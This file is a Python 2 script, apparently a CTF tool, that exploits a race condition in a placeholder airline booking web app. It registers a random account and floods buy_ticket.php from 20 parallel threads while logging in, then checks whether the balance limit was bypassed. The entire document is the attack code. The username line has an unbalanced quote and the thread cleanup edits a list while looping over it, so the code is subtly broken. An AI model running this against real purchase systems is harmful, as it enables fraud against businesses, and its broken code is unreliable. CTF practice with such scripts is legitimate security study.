# coding: utf8
#
# /!\ Quick'n'dirty script for CTF challenges, do not use for serious stuff
#
# Goal: try to exploit race-conditions in Web apps by launching many parallel requests
# Author: Clément Notin (@cnotin)

import requests
import string
import re
import random
import threading
from random import shuffle

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}
# proxies={}

url_register = "http://FIXME/register.php"
url_login = "http://FIXME/login.php"

headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"}

cookies = None  # {"PHPSESSID": "c6e8hjjit684l0vsl286oebc50"}
NB_THREADS = 20

threads = []

stop = False


def buy(data):
    global cookies
    global stop

    while not stop:
        requests.post("http://FIXME/myairline/buy_ticket.php",
                      cookies=cookies,
                      data=data, headers=headers,
                      proxies=proxies,
                      allow_redirects=False
                      )


def stop_threads():
    global stop
    global threads

    print "stopping threads"
    stop = True
    for t in threads:
        t.join()
        threads.remove(t)
    print "stopped all"
    threads = []


while True:
    # Generate random username
    username = "''.join(random.choice(string.ascii_letters) for _ in range(20))
    password = 'clem'

    data = {'rUsername': username, 'rPassword': password, 'rPassword2': password}
    print "Register"
    cookies = requests.cookies.RequestsCookieJar()
    cookies = requests.post(url_register, data=data, proxies=proxies, allow_redirects=False, headers=headers,
                            cookies=cookies).cookies
    resp = requests.get("http://FIXME/",
                        cookies=cookies,
                        proxies=proxies, headers=headers).text
    if "user has been created" in resp:
        print "Registered"
    else:
        print "[!] Failed\n"
        continue

    print "Creating threads"

    data = {"idFlightPost": "7"}
    for i in range(0, NB_THREADS):
        t = threading.Thread(target=buy, args=(data,))
        threads.append(t)
        t.start()

    shuffle(threads)

    print "Login"
    data = {'username': username, 'password': password}
    requests.post(url_login, data=data, cookies=cookies, proxies=proxies, allow_redirects=True, headers=headers)
    resp = requests.get("http://FIXME/myairline/index.php",
                        cookies=cookies,
                        proxies=proxies, headers=headers).text
    if "Log out" in resp:
        print "Logged"
    else:
        print "[!] Failed\n"
        stop_threads()
        continue

    resp = requests.get("http://FIXME/myairline/flights.php", cookies=cookies,
                        headers=headers, proxies=proxies).text
    balance = re.findall(r"Balance : (.*?)</p>", resp, re.DOTALL)[0]
    print balance

    print "buy 21"
    data={"idFlightPost": "21"}
    requests.post("http://FIXME/myairline/buy_ticket.php",
                  cookies=cookies,
                  data=data, headers=headers,
                  proxies=proxies,
                  allow_redirects=False
                  )
    print "bought 21"

    print "get new balance"
    resp = requests.get("http://FIXME/myairline/flights.php", cookies=cookies,
                        headers=headers, proxies=proxies).text
    balance = re.findall(r"Balance : (.*?)</p>", resp, re.DOTALL)[0]
    print balance


    stop_threads()
